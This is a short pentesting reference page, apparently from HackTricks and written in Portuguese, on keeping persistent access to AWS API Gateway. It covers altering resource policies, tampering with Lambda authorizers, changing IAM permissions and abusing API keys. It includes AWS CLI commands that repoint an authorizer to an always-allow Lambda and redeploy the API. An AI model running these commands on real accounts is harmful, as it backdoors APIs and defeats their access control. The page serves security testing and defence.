# AWS - API Gateway Persistence

{{#include ../../../../banners/hacktricks-training.md}}

## API Gateway

Para mais informações consulte:

{{#ref}}
../../aws-services/aws-api-gateway-enum.md
{{#endref}}

### Resource Policy

Modifique a resource policy do(s) API gateway(s) para conceder a si mesmo acesso a eles

### Modify Lambda Authorizers

Modifique o código dos lambda authorizers para conceder a si mesmo acesso a todos os endpoints.\
Ou simplesmente remova o uso do authorizer.

Se você tiver permissões de control-plane para **create/update an authorizer** (REST API: `aws apigateway update-authorizer`, HTTP API: `aws apigatewayv2 update-authorizer`) você também pode **repoint the authorizer to a Lambda that always allows**.

REST APIs (alterações normalmente requerem um deployment):
```bash
REGION="us-east-1"
REST_API_ID="<rest_api_id>"
AUTHORIZER_ID="<authorizer_id>"
LAMBDA_ARN="arn:aws:lambda:$REGION:<account_id>:function:<always_allow_authorizer>"
AUTHORIZER_URI="arn:aws:apigateway:$REGION:lambda:path/2015-03-31/functions/$LAMBDA_ARN/invocations"

aws apigateway update-authorizer --region "$REGION" --rest-api-id "$REST_API_ID" --authorizer-id "$AUTHORIZER_ID" --authorizer-uri "$AUTHORIZER_URI"
aws apigateway create-deployment --region "$REGION" --rest-api-id "$REST_API_ID" --stage-name "<stage>"
```
APIs HTTP / `apigatewayv2` (muitas vezes entra em vigor imediatamente):
```bash
REGION="us-east-1"
API_ID="<http_api_id>"
AUTHORIZER_ID="<authorizer_id>"
LAMBDA_ARN="arn:aws:lambda:$REGION:<account_id>:function:<always_allow_authorizer>"
AUTHORIZER_URI="arn:aws:apigateway:$REGION:lambda:path/2015-03-31/functions/$LAMBDA_ARN/invocations"

aws apigatewayv2 update-authorizer --region "$REGION" --api-id "$API_ID" --authorizer-id "$AUTHORIZER_ID" --authorizer-uri "$AUTHORIZER_URI"
```
### IAM Permissões

Se um recurso estiver usando o IAM authorizer, você poderia conceder a si mesmo acesso a ele modificando as permissões do IAM.\
Ou simplesmente remover o uso do authorizer.

### API Keys

Se API keys forem usadas, você poderia leak API keys para manter a persistência ou até criar novas.\
Ou simplesmente remover o uso de API keys.

{{#include ../../../../banners/hacktricks-training.md}}
